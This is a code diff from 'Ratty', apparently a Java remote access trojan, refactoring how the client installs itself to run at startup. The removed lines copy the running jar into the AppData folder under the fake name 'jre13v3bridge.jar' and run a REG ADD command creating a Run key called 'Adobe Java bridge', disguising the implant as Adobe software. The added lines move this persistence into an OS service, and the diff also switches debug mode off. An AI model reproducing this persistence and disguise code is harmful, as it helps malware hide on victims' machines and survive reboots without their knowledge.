@@ -15,6 +15,7 @@ import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.gui.server.RattyGui;
 import de.sogomn.rat.gui.server.RattyGuiController;
 import de.sogomn.rat.server.ActiveServer;
+import de.sogomn.rat.service.IOperatingSystemService;
 import de.sogomn.rat.util.XorCipher;
 
 /*
@@ -24,9 +25,10 @@ import de.sogomn.rat.util.XorCipher;
  */
 public final class Ratty {
 	
-	public static final boolean DEBUG = true;
+	public static final boolean DEBUG = false;
 	public static final String VERSION = "1.22.0";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
+	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
 	
 	private static final String ADDRESS;
 	private static final int PORT;
@@ -34,8 +36,6 @@ public final class Ratty {
 	
 	private static final int CONNECTION_INTERVAL = 5000;
 	private static final String CONNECTION_DATA_FILE_NAME = "/data";
-	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
-	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	
 	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
 	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
@@ -112,26 +112,6 @@ public final class Ratty {
 		}
 	}
 	
-	private static void addToStartup() {
-		final String os = System.getProperty("os.name").toUpperCase();
-		
-		if (!os.contains("WINDOWS")) {
-			return;
-		}
-		
-		try {
-			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
-			final File source = new File(sourceUri);
-			final File destination = new File(STARTUP_FILE_PATH);
-			
-			FileUtils.createFile(STARTUP_FILE_PATH);
-			FileUtils.copyFile(source, destination);
-			Runtime.getRuntime().exec(STARTUP_REGISTRY_COMMAND);
-		} catch (final Exception ex) {
-			ex.printStackTrace();
-		}
-	}
-	
 	private static int parsePort(final String input) {
 		try {
 			final int port = Integer.parseInt(input);
@@ -161,6 +141,17 @@ public final class Ratty {
 			
 			setSystemLookAndFeel();
 			startClient(ADDRESS, PORT);
+		}
+	}
+	
+	private static void addToStartup() {
+		try {
+			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
+			final File source = new File(sourceUri);
+			
+			OS_SERVICE.addToStartup(source);
+		} catch (final Exception ex) {
+			ex.printStackTrace();
 		}
 	}
 	
